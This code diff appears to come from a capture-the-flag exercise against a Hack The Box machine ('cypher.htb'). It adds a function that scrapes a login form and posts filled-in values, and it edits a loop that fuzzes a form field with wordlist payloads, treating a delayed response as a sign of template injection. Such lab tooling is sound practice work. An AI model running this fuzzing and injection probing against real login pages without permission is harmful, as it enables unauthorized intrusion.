@@ -13,9 +13,40 @@ from urllib.parse import urlencode
 # move to separate function but keep generic in main
 
 def cypher():
-  print("hello")
+
   url = "http://cypher.htb/login"
 
+  session = requests.Session()
+  response = session.get(url)
+  
+  soup = BeautifulSoup(response.text, "html.parser")
+
+  form = soup.find("form")
+  action = form.get("action")
+  post_url = urljoin(url, action)
+  print("This is the post URL: ", post_url)
+  
+  payload = {}
+  temp_payload = {'jack': 4098}
+  inputvalue_admin = "admin"
+  inputvalue_2 = "'"
+
+  for input_tag in form.find_all("input"):
+      name = input_tag.get("name")
+      value = input_tag.get("value", "admin")
+      if name:
+          payload[name] = value
+
+# add wordlist logic
+
+  print(payload)
+  post_response = session.post(post_url, data=payload, timeout=60)
+
+#  print(payload)
+
+  post_response = session.post(post_url, data=payload, timeout=60)
+  print(post_response.status_code)
+  print(post_response.text)
 
 def main():
 
@@ -58,16 +89,16 @@ def main():
         if payload[k] == "test":
             temp = payload[k]
             payload[k] = "FUZZVALUE"
-            encoded = urlencode(list(payload.items()))
-            encoded = encoded.replace('FUZZVALUE', x.strip())
+            encoded_payload = urlencode(list(payload.items()))
+            encoded_payload = encoded_payload.replace('FUZZVALUE', x.strip())
 
             start = time.monotonic()
-            post_response = session.post(post_url, data=encoded, timeout=60)
+            post_response = session.post(post_url, data=encoded_payload, timeout=60)
             elapsed = time.monotonic() - start
 
             if elapsed > 5:
                 print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
-                print("Full Payload:", encoded)
+                print("Full Payload:", encoded_payload)
                 print("payload: ", x)
                 sys.exit()
             payload[k] = temp
